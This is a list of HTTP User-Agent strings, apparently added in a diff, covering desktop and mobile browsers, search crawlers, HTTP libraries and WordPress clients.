+Mozilla/5.0 (Linux; Android 4.4.4; SM-T561) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2322.121 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2822.79 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4410.0 Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 9; SM-T720 Build/PPR1.180610.011)
+Mozilla/5.0 (Linux; Android 10; EVR-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/61.2.3076.56749
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2283.125 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; rv:86.0) Gecko/20100101 Firefox/86.0
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.3478.84 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; AMN-LX9 Build/HUAWEIAMN-LX9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 YandexSearch/7.30 YandexSearchBrowser/7.30
+Mozilla/5.0 (Linux; Android 8.0.0; ASUS_Z017DB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; GM1910) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2385.118 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2871.40 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2708.3 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3315.167 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2287.127 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2141.127 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; vivo 1819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36
+Offline Explorer/2.5
+Mozilla/5.0 (Linux; U; Android 9; en-US; RMX1851 Build/PKQ1.190101.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.8.1206 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3023.43 Safari/537.36
+Apache-HttpClient/4.5.9 (Java/1.8.0_262)
+Mozilla/5.0 (compatible; SERPtimizerBot;  http://serptimizer.com/serptimizer-bot)
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3872.0 Safari/537.36 Edg/78.0.244.0
+Mozilla/5.0 (Windows NT 10.2; rv:36.0) Gecko/20100101 Firefox/34.04
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0
+Mozilla/5.0 (Windows NT 6.1; rv:67.0) Gecko/20100101 Firefox/67.0
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3306.52 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36/8mqQaZuL-16
+Mozilla/5.0 (X11; Linux i686 (x86_64)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4413.0 Safari/537.36
+Mozilla/5.0 (compatible; Nesotebot/2.1;  http://www.inoutscripts.com/bot.html)
+Mozilla/5.0 (Linux; Android 8.0.0; LG-H870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 11; SM-G970F Build/RP1A.200720.012)
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2615.16 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Ubuntu/11.10 Chromium/18.0.1025.142 Chrome/18.0.1025.142 Safari/535.19
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.3146.91 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.71 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; ASJB; rv:11.0) like Gecko
+Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2440.140 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3198.96 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2794.105 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3347.25 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.145 Safari/537.36 Vivaldi/2.6.1566.49
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2987.91 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0; ; NCLIENT50_AAP826E9D226A8) like Gecko
+Dillo/0.8.5-i18n-misc
+Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2208.5 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36
+Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1 (compatible; woorankreview/2.0;  https://www.woorank.com/)
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2452.39 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2; Win64; x64;) Gecko/20100101 Firefox/20.0
+Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36
+Mozilla/5.0 (X11; NetBSD x86; en-us) AppleWebKit/666.6  (KHTML, like Gecko) Chromium/20.0.0000.00 Chrome/20.0.0000.00 Safari/666.6
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.3123.82 Safari/537.36
+ManicTime/4.6.7.0
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2530.37 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3483.49 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3119.116 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2549.164 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2904.82 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2397.159 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3502.99 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3005.121 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2168.147 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3291.46 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2658.26 Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.0; SM-J720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko Core/1.63.5977.400 LBBROWSER/10.1.3752.400
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2951.67 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2624.97 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.155 Mobile Safari/537.36
+Java/1.8.0_262
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36 OPR/74.0.3911.75 (Edition Yx 03)
+Mozilla/5.0 (Linux; Android 10; Lenovo TB-X306F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Safari/537.36
+Mozilla/5.0 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm) AppEngine-Google; ( http://code.google.com/appengine; appid: s~surf702-hrd)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3442.71 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.2236.79 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2747.150 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2465.30 Safari/537.36
+reFill/2 (https://en.wikipedia.org/wiki/User:Zhaofeng_Li/reFill)
+citoid
+Mozilla/5.0 (Linux; Android 5.1; Lenovo P70-A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2666.88 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; SM-J737T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-J727A) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile DuckDuckGo/5 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.3 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15
+Mozilla/5.0 (Linux; Android 8.0.0; moto e5 play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36 OPR/56.1.2780.51589
+Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; TECNO CC9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0; 5045T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; PCGM00 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/12.9 SP-engine/2.28.0 baiduboxapp/12.9.0.11 (Baidu; P1 10) NABar/1.0
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 SP-engine/2.28.0 main%2F1.0 baiduboxapp/12.9.0.14 (Baidu; P2 14.3) NABar/1.0 themeUA=Theme/default
+Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-J700T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36
+Mozilla/5.0 (Android 10; Mobile; rv:86.0) Gecko/86.0 Firefox/86.0
+Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; TAS-AN00 Build/HUAWEITAS-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/12.9 SP-engine/2.28.0 baiduboxapp/12.9.0.11 (Baidu; P1 10) NABar/1.0
+Mozilla/5.0 (Linux; Android 10; SM-A115U Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/137.2.345735309 Mobile/15E148 Safari/604.1
+Mozilla/5.0 (Linux; Android 10; ELE-AL00 Build/HUAWEIELE-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:86.0) Gecko/20100101 Firefox/86.0
+Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-X70L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/62.3.3146.57763
+Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (iPad; CPU OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.163 Mobile/15E148 Safari/604.1
+Mozilla/5.0 (Linux; Android 8.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile DuckDuckGo/5 Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/159.1.372414826 Mobile/15E148 Safari/604.1
+curb
+Mozilla/5.0 (iPad; CPU OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.71 Mobile/15E148 Safari/604.1
+Mozilla/5.0 (Linux; Android 6.0.1; vivo Y66 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/12.17 SP-engine/2.32.0 baiduboxapp/12.17.5.10 (Baidu; P1 6.0.1) NABar/1.0
+Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
+Mozilla/5.0 (Linux; Android 5.1; vivo X6D Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/12.17 SP-engine/2.32.0 baiduboxapp/12.18.0.10 (Baidu; P1 5.1) NABar/1.0
+Mozilla/5.0 (Linux; Android 11; PDSM00 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/12.17 SP-engine/2.32.0 baiduboxapp/12.18.0.10 (Baidu; P1 11) NABar/1.0
+Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.3945.117 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; NOH-AN00 Build/HUAWEINOH-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/12.17 SP-engine/2.32.0 baiduboxapp/12.18.0.10 (Baidu; P1 10) NABar/1.0
+Mozilla/5.0 (Windows NT 6.1; rv:11.0) Gecko/20100101 Firefox/11.0
+Mozilla/5.0 (Linux; Android 6.0.1; vivo Y66 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/12.19.0.0 SP-engine/2.33.0 baiduboxapp/12.19.0.11 (Baidu; P1 6.0.1) NABar/1.0
+Dalvik/2.1.0 (Linux; U; Android 10; CPH2185 Build/QP1A.190711.020)
+Mozilla/5.0 (Linux; Android 10; JNY-LX2; HMSCore 5.3.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 HuaweiBrowser/11.0.8.303 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:69.0) Gecko/20100101 Firefox/69.0
+Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930T Build/R16NW)
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; ELS-NX9; HMSCore 5.3.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 HuaweiBrowser/11.0.8.303 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Edg/89.0.774.48
+Dalvik/2.1.0 (Linux; U; Android 10; LM-Q730 Build/QKQ1.200216.002)
+Mozilla/5.0 (Linux; Android 10; HRY-LX1T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; Tablet PC 2.0; ms-office; MSOffice 15)
+Dalvik/2.1.0 (Linux; U; Android 8.0.0; BND-L34 Build/HUAWEIBND-L34)
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/155.0.367387567 Mobile/18B121 Safari/604.1
+com.google.android.apps.searchlite/173804 (Linux; U; Android 10; en_US; Infinix X688C; Build/QP1A.190711.020; Cronet/90.0.4430.210)
+Dalvik/2.1.0 (Linux; U; Android 11; vivo 1906 Build/RP1A.200720.012)
+com.google.android.apps.searchlite/173804 (Linux; U; Android 10; th_TH; W-K380-TVM; Build/QP1A.190711.020; Cronet/90.0.4430.210)
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0; HUAWEI MT7-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.0; SM-J327V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 10; M2007J17I MIUI/V12.0.6.0.QJSINXM)
+Mozilla/5.0 (Linux; Android 9; Redmi 7 Build/PKQ1.181021.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 GSA/12.6.13.23.arm64
+Mozilla/5.0 (Linux; Android 8.0.0; SM-G930V Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 GSA/12.22.8.23.arm64
+Mozilla/5.0 (Linux; Android 8.0.0; SM-G930V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G986U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 11; SM-G973U Build/RP1A.200720.012)
+Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) sieve-gq1/1624636618-0
+Mozilla/5.0 (Linux; Android 11; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 11; CPH2001 Build/RP1A.200720.011)
+Opal/6.9.10.0 CFNetwork/1197 Darwin/20.0.0
+WordPress/4.5.24; http://romtourist.com
+Opal/6.54.1.0 CFNetwork/1240.0.4 Darwin/20.5.0
+com.google.android.apps.searchlite/484573 (Linux; U; Android 9; en_US; Elite A5; Build/PPR1.180610.011; Cronet/90.0.4430.210)
+Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MATMJS; rv:11.0) like Gecko
+WordPress/5.4.6; https://www.fredmatic.eu
+Dalvik/2.1.0 (Linux; U; Android 11; M2101K6P Build/RKQ1.200826.002)
+SiriViewService/1.0 CFNetwork/978.0.7 Darwin/18.7.0
+Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C)
+Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) sieve.k8s.crawler-production/1624913143-0
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+uniq-c1f9381608a1fb3aac612a969e53d8f3
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; JNY-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:88.0) Gecko/20100101 Firefox/88.0
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.123 Safari/537.36
+Mozilla/5.0 (Android 8.1.0; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0
+Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-A505FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 GSA/12.23.16.23.arm64
+Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/166.0.381336632 Mobile/17C54 Safari/604.1
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; ms-office)
+com.google.android.apps.searchlite/63665 (Linux; U; Android 8.1.0; en_US; Infinix X624; Build/O11019; Cronet/90.0.4430.82)
+Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Safari/537.36 GSA/12.1.9.23.arm
+digitaldukaan/27 CFNetwork/1240.0.4 Darwin/20.5.0
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/970FA82
+Dalvik/2.1.0 (Linux; U; Android 11; SM-M215F Build/RP1A.200720.012)
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/162.0.375868988 Mobile/18C66 Safari/604.1
+WordPress/5.7.2; https://www.pharmakeys.com
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
+Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1
